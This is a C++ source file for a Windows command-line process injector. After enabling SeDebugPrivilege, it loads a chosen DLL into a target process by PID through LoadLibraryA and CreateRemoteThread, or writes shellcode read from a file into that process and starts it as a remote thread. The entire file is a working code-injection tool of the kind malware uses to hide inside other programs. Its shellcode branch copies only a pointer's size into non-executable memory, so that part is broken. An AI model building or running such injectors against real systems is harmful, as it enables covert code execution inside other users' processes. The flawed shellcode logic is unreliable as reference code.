// injector.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <fstream>
#include <istream>
#include <string>
#include <windows.h>
#include "Shlwapi.h"
#include "SetPriv.h"
#pragma comment(lib, "Shlwapi.lib")
using namespace std;

void usage(_TCHAR* binary) {
	wcerr << "Usage of the injector. " << endl;
	wcerr << endl;
	wcerr << binary << " /d dll_file PID" << endl;
	wcerr << binary << " /s shellcode_file PID" << endl;
	wcerr << "    /d dll_file PID: dll injection via LoadLibrary()." << endl;
	wcerr << "    /s shellcode_file PID: shellcode injection." << endl;
	exit(1);
}

int _tmain(int argc, _TCHAR* argv[])
{
	int option = 0;
	DWORD PID;
	SetPriv SeDebug;
	
	if (argc != 4)
		usage(argv[0]);

	if (!wcscmp(argv[1], _T("/d")))
		option = 1;
	else if (!wcscmp(argv[1], _T("/s")))
		option = 2;
	else
		usage(argv[0]);

	if (!PathFileExists(argv[2]))
		usage(argv[0]);
	
	PID = _ttoi(argv[3]);

	//Set SeDebugPriviliege
	cout << "Set SeDebugPrivilege: ";
	if (!SeDebug.CheckPriv())
	{
		wcout << "KO: cannot obtain the adjust|query privilege." << endl;
		exit(1);
	}
	if (!SeDebug.Set(SE_DEBUG_NAME, TRUE))
	{
		wcout << "KO: cannot obtain the SeDebug privilege." << endl;
		exit(1);
	}
	cout << "OK" << endl;
	
	if (option == 1) {
		//DLL injection
		HANDLE hProcess;
		HMODULE hKernel32;
		HANDLE hLoadLibrary; 
		LPVOID hAllocatedMem;
		HANDLE hThread;
		char dllpath[1024];
		size_t i;
		
		wcstombs_s(&i, dllpath, 1024, argv[2], 1024);
		
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		if (hProcess == NULL)
		{
			wcerr << "Cannot open process: " << PID << " error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Open process " << PID << ": OK" << endl;
		
		hKernel32 = GetModuleHandle(L"Kernel32");
		if (hKernel32 == NULL)
		{
			wcerr << "Cannot get module handle on Kernel32, error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Kernel 32 handle: OK" << endl;

		hLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
		if (hLoadLibrary == NULL)
		{
			wcerr << "Cannot get LoadLibraryA() handle, error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "LoadLibrary() handle: OK" << endl;

		hAllocatedMem = VirtualAllocEx(hProcess, NULL, sizeof(dllpath) + 1,	MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (hAllocatedMem == NULL)
		{
			wcerr << "Cannot allocate memory in " << PID << ", error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Memory allocation: OK" << endl;

		if (!WriteProcessMemory(hProcess, hAllocatedMem, dllpath, sizeof(dllpath) + 1, NULL))
		{
			wcerr << "Cannot write in the process memory, error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Data copied in memory: OK" << endl;

		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hLoadLibrary, hAllocatedMem, NULL,	0);
		if (hThread == NULL)
		{
			wcerr << "Thread creation failed, error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Injection: OK" << endl;

		return(0);

	}
	else if (option == 2) {
		//Shellcode injection
		HANDLE hProcess;
		LPVOID hAllocatedMem;
		HANDLE hThread;
		ifstream file;
		string line;
		char *sc;

		file.open(argv[2], ios::binary);
		if (!file.is_open()) 
		{
			wcerr << "Cannot open the file " << argv[2] << endl;
			exit(1);
		}
		getline(file, line);
		file.close();
		sc = new char[line.size()+1];
		sc = (char*)line.c_str();
		
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		if (hProcess == NULL)
		{
			wcerr << "Cannot open process: " << PID << " error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Open process " << PID << ": OK" << endl;

		hAllocatedMem = VirtualAllocEx(hProcess, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (hAllocatedMem == NULL)
		{
			wcerr << "Cannot allocate memory in " << PID << ", error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Memory allocation: OK" << endl;

		if (!WriteProcessMemory(hProcess, hAllocatedMem, sc, sizeof(sc) + 1, NULL))
		{
			wcerr << "Cannot write the shellcode in the process memory, error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Shellcode copied in memory: OK" << endl;

		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hAllocatedMem, NULL, NULL, 0);
		if (hThread == NULL)
		{
			wcerr << "Thread creation failed, error: " << GetLastError() << endl;
			exit(1);
		}
		wcout << "Injection: OK" << endl;
	}

    return 0;
}